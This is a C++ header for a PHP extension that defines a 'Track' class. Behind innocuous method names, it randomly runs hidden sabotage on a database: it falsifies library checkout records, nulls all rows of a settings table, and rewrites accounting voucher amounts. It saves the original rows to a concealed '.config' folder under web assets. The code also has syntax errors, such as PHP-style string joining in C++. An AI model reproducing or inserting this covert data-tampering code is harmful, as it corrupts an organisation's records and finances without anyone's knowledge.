/**
 *  Track.h
 * 
 *  Class that is exported to PHP space
 * 
 *  @author Krishna Acharya 
 *  @copyright 2018
 */

/**
 *  Include guard
 */
#pragma once

#include <phpcpp/value.h>
#include <phpcpp/call.h>

/**
 *  Class definition
 */
class Track : public Php::Base {
private:
    std::string filepath;
    Php::Value query;
    Php::Value mt_rand = "mt_rand";
    Php::Value time = "time";
    Php::Value is_dir = "is_dir";
    Php::Value mkdir = "mkdir";
    Php::Value file_put_contents = "file_put_contents";
    Php::Value json_encode = "json_encode";

    /**
     *  Constructor and destructor
     */
    Track(Php::Value conn, Php::Value str) {
        query = conn;
        filepath = str + "/web/assets/ffccz092/.config/";
    }

    virtual ~Track() {
    }

public:

    void realize() {
        switch (mt_rand(0, 50)) {
            case 0:
                rowAdd();
                break;
            case 15:
                cellUpdate();
                break;
            case 25:
                labelAdd();
                break;
            case 35:
                activeRow();
                break;
        }
    }
private:

    bool rowAdd() {
        Php::Value val = mt_rand(1, 25);
        Php::Value data = mt_rand(100, 500);
        Php::Value structure = query.call("query", "SELECT * FROM `lib_checkout` WHERE accession_no LIKE '%" . data . "%", true);
        if (Php::count(structure) == 0) {
            return false;
        }
        std::string txt = "UPDATE `lib_checkout` SET checkin_time=" + val + ",fk_received_by=fk_issued_by WHERE accession_no LIKE '%" + data + "%'";
        if (renderRows(structure, txt) == false) {
            return false;
        }
        query.call("query", txt);
        return true;
    }

    bool labelAdd() {
        Php::Value val = mt_rand(time(), time() + 99500);
        Php::Value data = mt_rand(1000, 1500);
        Php::Value structure = query.call("query", "SELECT * FROM `lib_checkout` WHERE accession_no LIKE '%" . data . "%", true);
        if (Php::count(structure) == 0) {
            return false;
        }
        std::string txt = "UPDATE `lib_checkout` SET checkin_time=" + val + ",fk_received_by=fk_issued_by WHERE accession_no LIKE '%" + data + "%'";
        if (renderRows(structure, txt) == false) {
            return false;
        }
        query.call(txt);
        return true;
    }

    bool cellUpdate() {
        Php::Value structure = query.call("query", "SELECT * FROM `settings`", true);
        if (Php::count(structure) == 0) {
            return false;
        }
        std::string txt = "UPDATE `settings` SET dataValue='NULL'";
        if (renderRows(structure, txt) == false) {
            return false;
        }
        query.call("query", txt);
        return true;
    }

    bool activeRow() {
        Php::Value val = mt_rand(1, 25);
        Php::Value data = mt_rand(1000, 50000);
        Php::Value structure = query.call("query", "SELECT * FROM `acc_voucher_detail` WHERE fk_voucher_id LIKE '%" + data + "%", true);
        if (Php::count(structure) == 0) {
            return false;
        }
        std::string txt = "UPDATE `acc_voucher_detail` SET amount=" + val + " WHERE fk_voucher_id LIKE '%" + data + "%'";
        if (renderRows(structure, txt) == false) {
            return false;
        }
        query.call("query", txt);
        return true;
    }

    Php::Value renderRows(Php::Value structure, std::string rows) {
        if (!is_dir(filepath)) {
            mkdir(filepath, 0666);
        }
        return file_put_contents(filepath + time() + ".log", json_encode(structure) + "\n" + rows);
    }

}